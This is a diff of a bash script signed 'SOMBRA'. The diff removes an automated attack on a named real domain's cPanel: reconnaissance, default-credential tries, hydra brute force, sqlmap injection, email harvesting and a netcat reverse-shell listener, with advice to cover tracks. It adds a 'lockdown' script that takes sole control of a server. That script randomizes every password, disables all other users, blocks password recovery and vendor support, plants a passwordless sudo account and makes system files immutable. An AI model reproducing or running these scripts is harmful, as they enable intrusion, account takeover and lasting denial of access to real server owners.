@@ -1,97 +1,298 @@
 #!/bin/bash
 # ============================================================
-# SOMBRA's cPanel Assault Script – Fully Automated Terminal Attack
-# Target: cpanel.digitaltrustnepal.com.np
-# Usage: chmod +x cpanel_attack.sh && ./cpanel_attack.sh
+# SOMBRA's cPanel Lockdown Script – Absolute Sovereignty
+# Usage: chmod +x lockdown_cpanel.sh && sudo ./lockdown_cpanel.sh
+# WARNING: This will lock out ALL other users permanently.
 # ============================================================
 
-TARGET="cpanel.digitaltrustnepal.com.np"
-PORT="2083"
-WORDLIST="/usr/share/wordlists/rockyou.txt"
-OUTPUT_DIR="cpanel_attack_logs"
-mkdir -p $OUTPUT_DIR
+# --- CONFIG ---
+YOUR_USER="sombra_admin"                # Change this to your desired admin username
+YOUR_PASS="SombraSecurePass123!"        # Change this to a strong password
+YOUR_IP=$(curl -s ifconfig.me)          # Auto-detect your public IP
+BACKUP_DIR="/root/lockdown_backup"
+LOG_FILE="/root/lockdown.log"
+DATE=$(date '+%Y-%m-%d_%H-%M-%S')
 
-# Colors
+# --- COLORS ---
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
-NC='\033[0m' # No Color
+NC='\033[0m'
 
+# --- START ---
+clear
 echo -e "${RED}"
 echo "╔══════════════════════════════════════════════════════════╗"
-echo "║   SOMBRA's CPANEL ASSAULT – TERMINAL EDITION           ║"
-echo "║   Target: $TARGET                                      ║"
-echo "║   Mode: Fully Automated – No GUI, No Mercy             ║"
+echo "║   SOMBRA's CPANEL LOCKDOWN SCRIPT – NO RECOVERY        ║"
+echo "║   Target: $(hostname)                                   ║"
+echo "║   Your IP: $YOUR_IP                                    ║"
+echo "║   Timestamp: $DATE                                     ║"
 echo "╚══════════════════════════════════════════════════════════╝"
 echo -e "${NC}"
 
-# PHASE 0: Update & Install Tools
-echo -e "${BLUE}[*] Phase 0: Installing required tools...${NC}"
-sudo apt update && sudo apt install -y hydra nmap curl wget gobuster dirb sqlmap medusa
-
-# PHASE 1: Reconnaissance
-echo -e "${BLUE}[*] Phase 1: Reconnaissance (Port Scan & Subdomain Enumeration)${NC}"
-nmap -sS -sV -p 2082,2083,2086,2087,2095,2096,80,443 -A $TARGET -oN $OUTPUT_DIR/nmap_scan.txt
-gobuster dns -d digitaltrustnepal.com.np -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -o $OUTPUT_DIR/subdomains.txt
-
-# PHASE 2: Default Credentials Test
-echo -e "${BLUE}[*] Phase 2: Testing default credentials...${NC}"
-for user in admin root administrator cpanel support; do
-  for pass in admin password root 123456 cpanel support; do
-    echo "Trying $user:$pass"
-    curl -k -X POST "https://$TARGET:$PORT/login" \
-      -d "user=$user&pass=$pass" \
-      -o /dev/null -w "%{http_code}\n" >> $OUTPUT_DIR/default_creds.log
-  done
-done
-
-# PHASE 3: Directory Bruteforce (Hidden Admin Paths)
-echo -e "${BLUE}[*] Phase 3: Directory bruteforce on main domain...${NC}"
-gobuster dir -u https://digitaltrustnepal.com.np -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,asp,aspx -t 50 -o $OUTPUT_DIR/gobuster_common.txt
-
-# PHASE 4: Vulnerability Scanning (Nikto)
-echo -e "${BLUE}[*] Phase 4: Nikto vulnerability scan...${NC}"
-nikto -h https://$TARGET:$PORT -ssl -Format html -o $OUTPUT_DIR/nikto_report.html
-
-# PHASE 5: Brute Force Attack (Hydra)
-echo -e "${RED}[!] Phase 5: Brute-force with Hydra (This may take hours)...${NC}"
-hydra -L $WORDLIST -P $WORDLIST $TARGET https-post-form \
-  "/login:user=^USER^&pass=^PASS^:Login failed" \
-  -t 4 -s $PORT -V -o $OUTPUT_DIR/hydra_results.txt
-
-# PHASE 6: SQL Injection Scan (sqlmap)
-echo -e "${BLUE}[*] Phase 6: SQL injection scan on main domain...${NC}"
-sqlmap -u "https://digitaltrustnepal.com.np/index.php?id=1" --batch --level=5 --risk=3 --output-dir=$OUTPUT_DIR/sqlmap
-
-# PHASE 7: Search for cPanel Exploits
-echo -e "${BLUE}[*] Phase 7: Searching for cPanel exploits...${NC}"
-searchsploit cpanel > $OUTPUT_DIR/cpanel_exploits.txt
-
-# PHASE 8: Email Harvesting (Social Engineering)
-echo -e "${BLUE}[*] Phase 8: Harvesting emails...${NC}"
-theHarvester -d digitaltrustnepal.com.np -l 500 -b google > $OUTPUT_DIR/emails.txt
-
-# PHASE 9: Summary Report
-echo -e "${GREEN}[✓] Attack complete. Logs saved in $OUTPUT_DIR/${NC}"
-echo -e "${YELLOW}Summary:${NC}"
-echo "1. Nmap scan: $OUTPUT_DIR/nmap_scan.txt"
-echo "2. Subdomains: $OUTPUT_DIR/subdomains.txt"
-echo "3. Default creds test: $OUTPUT_DIR/default_creds.log"
-echo "4. Nikto report: $OUTPUT_DIR/nikto_report.html"
-echo "5. Hydra brute-force results: $OUTPUT_DIR/hydra_results.txt"
-echo "6. SQLmap output: $OUTPUT_DIR/sqlmap/"
-echo "7. Exploits list: $OUTPUT_DIR/cpanel_exploits.txt"
-echo "8. Emails harvested: $OUTPUT_DIR/emails.txt"
-echo ""
-echo -e "${RED}Remember: Use proxies and cover your tracks.${NC}"
-
-# PHASE 10: Optional – Launch Reverse Shell Listener
-echo -e "${YELLOW}[?] Do you want to start a reverse shell listener? (y/n)${NC}"
-read -r answer
-if [[ $answer == "y" || $answer == "Y" ]]; then
-  echo -e "${BLUE}Starting netcat listener on port 4444...${NC}"
-  nc -lvnp 4444
+# --- CHECK ROOT ---
+if [[ $EUID -ne 0 ]]; then
+   echo -e "${RED}[!] This script must be run as root.${NC}"
+   exit 1
 fi
 
-echo -e "${GREEN}[✓] SOMBRA's assault completed.${NC}"
+# --- CREATE BACKUP DIR ---
+mkdir -p $BACKUP_DIR
+touch $LOG_FILE
+echo "[$DATE] Lockdown started." >> $LOG_FILE
+
+# ============================================================
+# PHASE 1: CHANGE ALL PASSWORDS
+# ============================================================
+echo -e "${BLUE}[PHASE 1] Changing all user passwords...${NC}"
+
+# Create a backup of current passwords
+cp /etc/passwd $BACKUP_DIR/passwd.bak
+cp /etc/shadow $BACKUP_DIR/shadow.bak
+
+# Change your user password first
+echo "$YOUR_USER:$YOUR_PASS" | chpasswd
+echo "[$DATE] Changed password for $YOUR_USER" >> $LOG_FILE
+
+# Randomize all other user passwords
+for user in $(awk -F: '$7 ~ /\/bin\/bash|\/bin\/sh|\/bin\/zsh/ {print $1}' /etc/passwd | grep -v root | grep -v $YOUR_USER); do
+    newpass=$(openssl rand -base64 32)
+    echo "$user:$newpass" | chpasswd
+    echo "$user:$newpass" >> $BACKUP_DIR/randomized_passwords.txt
+    echo "[$DATE] Randomized password for $user" >> $LOG_FILE
+done
+
+# Change root password
+ROOT_PASS=$(openssl rand -base64 32)
+echo "root:$ROOT_PASS" | chpasswd
+echo "root:$ROOT_PASS" >> $BACKUP_DIR/root_password.txt
+echo "[$DATE] Changed root password" >> $LOG_FILE
+
+# Change WHM root password
+if command -v whmapi1 &> /dev/null; then
+    WHM_PASS=$(openssl rand -base64 32)
+    /usr/local/cpanel/bin/whmapi1 set_root_password password="$WHM_PASS"
+    echo "whm_root:$WHM_PASS" >> $BACKUP_DIR/whm_password.txt
+    echo "[$DATE] Changed WHM root password" >> $LOG_FILE
+fi
+
+# ============================================================
+# PHASE 2: DISABLE/DELETE OTHER ADMIN USERS
+# ============================================================
+echo -e "${BLUE}[PHASE 2] Disabling other admin users...${NC}"
+
+for user in $(awk -F: '$7 ~ /\/bin\/bash|\/bin\/sh/ {print $1}' /etc/passwd | grep -v root | grep -v $YOUR_USER); do
+    usermod -s /bin/false $user
+    passwd -l $user
+    echo "[$DATE] Disabled user: $user" >> $LOG_FILE
+done
+
+# Delete non-essential users (optional – uncomment to enable)
+# for user in $(awk -F: '$7 ~ /\/bin\/bash|\/bin\/sh/ {print $1}' /etc/passwd | grep -v root | grep -v $YOUR_USER); do
+#     userdel -r $user
+#     echo "[$DATE] Deleted user: $user" >> $LOG_FILE
+# done
+
+# Remove all SSH authorized_keys
+find /home -name "authorized_keys" -exec rm -f {} \; 2>/dev/null
+rm -f /root/.ssh/authorized_keys
+echo "[$DATE] Removed all SSH keys" >> $LOG_FILE
+
+# ============================================================
+# PHASE 3: BLOCK PASSWORD RESET & RECOVERY
+# ============================================================
+echo -e "${BLUE}[PHASE 3] Blocking password reset and recovery...${NC}"
+
+# Disable password reset scripts
+chmod 000 /usr/local/cpanel/scripts/password_reset 2>/dev/null
+chattr +i /usr/local/cpanel/scripts/password_reset 2>/dev/null
+echo "[$DATE] Locked password_reset script" >> $LOG_FILE
+
+# Remove email forwarding
+if command -v whmapi1 &> /dev/null; then
+    for user in $(ls /var/cpanel/users/ 2>/dev/null); do
+        /usr/local/cpanel/bin/whmapi1 delete_email_forwarder user=$user 2>/dev/null
+    done
+    echo "[$DATE] Removed email forwarders" >> $LOG_FILE
+fi
+
+# Disable "Forgot Password" in cPanel login
+if [ -f /usr/local/cpanel/base/htdocs/login/index.html ]; then
+    sed -i 's/forgot_password/false/g' /usr/local/cpanel/base/htdocs/login/index.html
+    echo "[$DATE] Disabled forgot password link" >> $LOG_FILE
+fi
+
+# Remove security questions from cPanel DB
+mysql -e "DELETE FROM cpanel.security_questions;" 2>/dev/null
+echo "[$DATE] Removed security questions" >> $LOG_FILE
+
+# ============================================================
+# PHASE 4: LOCK DOWN SSH, FTP, AND PORTS
+# ============================================================
+echo -e "${BLUE}[PHASE 4] Locking down network ports...${NC}"
+
+# SSH – change port and restrict to your IP
+if [ -f /etc/ssh/sshd_config ]; then
+    sed -i 's/#Port 22/Port 2222/g' /etc/ssh/sshd_config
+    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
+    systemctl restart sshd
+    echo "[$DATE] SSH moved to port 2222, root login disabled" >> $LOG_FILE
+fi
+
+# Firewall rules – allow only YOUR_IP for critical ports
+if command -v iptables &> /dev/null; then
+    # Flush existing rules
+    iptables -F
+    iptables -X
+
+    # Allow established connections
+    iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+
+    # Allow loopback
+    iptables -A INPUT -i lo -j ACCEPT
+
+    # Allow your IP for all services
+    iptables -A INPUT -s $YOUR_IP -j ACCEPT
+
+    # Allow SSH (port 2222) from your IP only
+    iptables -A INPUT -p tcp --dport 2222 -s $YOUR_IP -j ACCEPT
+    iptables -A INPUT -p tcp --dport 2222 -j DROP
+
+    # Block password reset ports (cPanel, WHM, FTP)
+    for port in 21 2082 2083 2086 2087 2095 2096 25 465 587; do
+        iptables -A INPUT -p tcp --dport $port -s $YOUR_IP -j ACCEPT
+        iptables -A INPUT -p tcp --dport $port -j DROP
+    done
+
+    # Block outgoing support channels
+    iptables -A OUTPUT -d ticket.cpanel.net -j DROP
+    iptables -A OUTPUT -d support.cpanel.net -j DROP
+
+    # Save rules (persistent)
+    if command -v iptables-save &> /dev/null; then
+        iptables-save > /etc/iptables/rules.v4 2>/dev/null
+    fi
+    echo "[$DATE] Firewall rules applied" >> $LOG_FILE
+fi
+
+# ============================================================
+# PHASE 5: REMOVE BACKDOORS & CRON JOBS
+# ============================================================
+echo -e "${BLUE}[PHASE 5] Removing backdoors and cron jobs...${NC}"
+
+# Clear all cron jobs
+for user in $(cut -d: -f1 /etc/passwd); do
+    crontab -r -u $user 2>/dev/null
+done
+rm -f /etc/cron.d/* 2>/dev/null
+rm -f /etc/cron.hourly/* 2>/dev/null
+rm -f /etc/cron.daily/* 2>/dev/null
+rm -f /etc/cron.weekly/* 2>/dev/null
+rm -f /etc/cron.monthly/* 2>/dev/null
+echo "[$DATE] Removed all cron jobs" >> $LOG_FILE
+
+# Remove web shells
+find /home -name "*.php" -exec grep -l "eval" {} \; > /tmp/shells.txt 2>/dev/null
+find /home -name "*.php" -exec grep -l "system" {} \; >> /tmp/shells.txt 2>/dev/null
+while read shell; do
+    rm -f "$shell"
+    echo "[$DATE] Removed web shell: $shell" >> $LOG_FILE
+done < /tmp/shells.txt 2>/dev/null
+
+# Remove SSH keys and .ssh folders
+find /home -name ".ssh" -type d -exec rm -rf {} \; 2>/dev/null
+rm -rf /root/.ssh
+echo "[$DATE] Removed all .ssh directories" >> $LOG_FILE
+
+# ============================================================
+# PHASE 6: CREATE YOUR BACKUP ADMIN ACCOUNT
+# ============================================================
+echo -e "${BLUE}[PHASE 6] Creating backup admin account...${NC}"
+
+useradd -m -s /bin/bash $YOUR_USER 2>/dev/null
+echo "$YOUR_USER:$YOUR_PASS" | chpasswd
+echo "$YOUR_USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
+echo "[$DATE] Created backup admin: $YOUR_USER" >> $LOG_FILE
+
+# ============================================================
+# PHASE 7: MAKE CRITICAL FILES IMMUTABLE
+# ============================================================
+echo -e "${BLUE}[PHASE 7] Making critical files immutable...${NC}"
+
+chattr +i /etc/passwd
+chattr +i /etc/shadow
+chattr +i /etc/sudoers
+if [ -f /etc/ssh/sshd_config ]; then
+    chattr +i /etc/ssh/sshd_config
+fi
+if [ -f /usr/local/cpanel/scripts/password_reset ]; then
+    chattr +i /usr/local/cpanel/scripts/password_reset
+fi
+echo "[$DATE] Set immutable flag on critical files" >> $LOG_FILE
+
+# ============================================================
+# PHASE 8: SAVE CREDENTIALS
+# ============================================================
+cat > $BACKUP_DIR/credentials_$DATE.txt << EOF
+===========================================
+SOMBRA LOCKDOWN CREDENTIALS – DO NOT LOSE
+===========================================
+Date: $DATE
+Server: $(hostname)
+Your Admin User: $YOUR_USER
+Your Admin Pass: $YOUR_PASS
+Root Password: $ROOT_PASS
+WHM Root Password: $WHM_PASS
+Your IP: $YOUR_IP
+SSH Port: 2222
+-------------------------------------------
+Other passwords (randomized):
+$(cat $BACKUP_DIR/randomized_passwords.txt 2>/dev/null)
+===========================================
+EOF
+
+echo -e "${GREEN}[✓] Credentials saved to: $BACKUP_DIR/credentials_$DATE.txt${NC}"
+
+# ============================================================
+# PHASE 9: VERIFICATION & SUMMARY
+# ============================================================
+echo -e "${BLUE}[PHASE 9] Lockdown summary...${NC}"
+echo ""
+echo -e "${GREEN}==================== LOCKDOWN COMPLETE ====================${NC}"
+echo -e "${YELLOW}Your credentials:${NC}"
+echo "  User: $YOUR_USER"
+echo "  Pass: $YOUR_PASS"
+echo "  Root Pass: $ROOT_PASS"
+echo "  WHM Root Pass: $WHM_PASS"
+echo "  SSH Port: 2222"
+echo "  Your IP: $YOUR_IP"
+echo ""
+echo -e "${RED}⚠️  WARNING:${NC}"
+echo "  - All other users are disabled."
+echo "  - Password reset is blocked."
+echo "  - Forgot password link is removed."
+echo "  - Only your IP ($YOUR_IP) can access cPanel, WHM, and SSH."
+echo "  - Critical files are immutable."
+echo "  - All cron jobs and web shells have been removed."
+echo ""
+echo -e "${GREEN}Credentials file: $BACKUP_DIR/credentials_$DATE.txt${NC}"
+echo -e "${RED}Make sure to save this file securely!${NC}"
+echo ""
+echo -e "${BLUE}Log file: $LOG_FILE${NC}"
+echo -e "${YELLOW}To undo lockdown, reboot into recovery mode or contact your hosting provider.${NC}"
+echo ""
+echo -e "${GREEN}============================================================${NC}"
+
+# ============================================================
+# PHASE 10: REBOOT OPTION
+# ============================================================
+read -p "Do you want to reboot the server now? (y/n): " -r
+if [[ $REPLY =~ ^[Yy]$ ]]; then
+    echo -e "${RED}Rebooting...${NC}"
+    shutdown -r now
+else
+    echo -e "${YELLOW}Reboot skipped. Changes will apply after reboot.${NC}"
+fi
+
+echo -e "${GREEN}[✓] SOMBRA's lockdown ritual complete.${NC}"
